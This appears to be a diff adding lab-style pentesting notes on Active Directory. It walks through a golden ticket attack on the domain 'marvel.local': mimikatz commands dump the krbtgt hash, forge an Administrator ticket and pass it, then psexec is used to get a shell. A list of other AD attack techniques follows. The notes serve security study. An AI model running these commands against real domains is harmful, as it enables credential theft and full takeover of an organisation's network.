@@ -273,8 +273,52 @@ Set good password policy
 
 --------------------------------------------GOLDEN ticket Attacks---------------------------
 
+with kerberos ticket , we can request access to any resource or system on the domain using the TGS.
+if we have golden ticket we may have complete access all the machine shell,files and folders.
 
+in domain controller:
+$mimikatz.exe
 
+#privilege::debug
+#lsadump::lsa /inject /nmae:krbtgt
+
+open notepad
+copy SID and NTLM IN NOTEPAD
+
+#kerberos::golden /User:Administrator /domain:marvel.local /sid:sidno /krbtgt:number /id:500 /ptt
+
+admin account - 500
+pass the ticket -ptt
+
+golden ticket for admin@marvel.local successfully submitted for current session.
+
+#misc:cmd
+
+#dir \\THEPUNISHER\C
+
+We can download the psexec.py tool for windows 
+#psexec.exe \\THEPUNISHER cmd.exe 
+
+got the shell
+
+-----------------------------------------------------Conclusion And Additional Resources------------------------------------------
+
+1.LLMNR Poisoning 
+2.SMB relay
+3.Man-in-the-middle attack
+4.kerberosing
+5.hash the password
+6.token impersonation
+7.gpp passwords 
+8.cpassword
+9.lsa dumping
+
+*adsecurity.org
+*harmjoy.net
+*pentesteracademy.com
+*elearnsecurity.com
+
+--------------------------------------------------------------------------------------------------------------
 
 
 
